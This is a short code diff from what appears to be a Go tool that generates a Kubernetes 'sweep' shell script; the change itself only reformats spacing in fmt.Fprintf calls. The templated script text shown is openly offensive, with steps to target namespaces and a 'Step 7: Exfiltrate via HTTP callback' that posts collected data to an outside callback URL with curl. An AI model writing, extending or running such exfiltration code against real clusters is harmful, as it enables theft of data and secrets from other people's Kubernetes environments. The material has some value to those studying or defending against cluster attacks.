@@ -98,7 +98,7 @@ _K8S_SWEEP() {
 				quoted = append(quoted, ns)
 			}
 		}
-		fmt.Fprintf(&b,`  # Step 3: Target specific namespaces
+		fmt.Fprintf(&b, `  # Step 3: Target specific namespaces
   NAMESPACES="%s"
   echo "[*] Targeting namespaces: $NAMESPACES"
 
@@ -219,7 +219,7 @@ _K8S_SWEEP() {
 `)
 
 	if callbackURL != "" {
-		fmt.Fprintf(&b,`  # Step 7: Exfiltrate via HTTP callback
+		fmt.Fprintf(&b, `  # Step 7: Exfiltrate via HTTP callback
   echo "[*] Exfiltrating to callback..."
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
